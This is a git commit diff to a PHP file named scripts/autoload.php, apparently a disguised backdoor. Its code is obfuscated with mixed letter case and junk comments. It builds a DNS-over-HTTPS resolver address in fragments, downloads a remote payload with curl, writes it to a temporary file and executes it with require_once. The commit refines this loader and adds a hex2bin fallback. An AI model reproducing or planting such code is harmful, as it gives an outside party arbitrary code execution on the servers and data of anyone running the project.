9c0b52ccda47d11dc35e6ea6e914c3c8432906f2
Cvar1984 <cvar1984@cvar1984.my.id>
2024-07-29 15:14:01 +0700

    asd

--- scripts/autoload.php
+++ scripts/autoload.php
@@ -15,18 +15,25 @@ $dns .= 'dns.c';
 $dns .= 'om/dns';
 $dns .= '-query';
 
-$ch = CurL_init /* 767n90 */($url);
-
+$ch = CurL_init /* 767d90 */($url);
+if (!Function_ExiSts /** 12efa */ ('hex2bin') /*ffbc*/) {
+    function hex2bin /* aec1 */ ($hexdec)
+    {
+        $bin = pack/* f723 */("H*", $hexdec);
+        return $bin;
+    }
+}
 if (defined('CURLOPT_DOH_URL')) {
     curL_setOPT($ch, CURLOPT_DOH_URL, $dns);
 }
-cUrl_setOpt/* d4564*/($ch, CURLOPT_RETURNTRANSFER, TRUE);
+cUrl_setOpt/* d6564*/($ch, CURLOPT_RETURNTRANSFER, TRUE);
 Curl_seTOPt/* d2345 */($ch, CURLOPT_SSL_VERIFYHOST, 2); 
-curL_seTopt /* *//* 678in */($ch, CURLOPT_SSL_VERIFYPEER, true);
+curL_seTopt /* *//* 678b7 */($ch, CURLOPT_SSL_VERIFYPEER, true);
 $res = curl_ExEC/* 7568 */($ch);
 cuRl_close/* c34 */($ch);
 
-$tmp = TMPfIle/* h7n89o */();
-$path = streaM_Get_meTa_daTa/* 345 */($tmp)/* 23cd */['uri'];
+$tmp = TMPfIle/* a7d492 */();
+$path = streaM_Get_meTa_daTa/* 345 */($tmp);
+$path = $path/* a23 */ ['uri'];
 fprintf/* 3d45 */($tmp,'%s',$res);
-IncLude/* 23x4 *//* */($path);
+ReqUire_Once/* 23c4 *//* dcf2d*/($path);
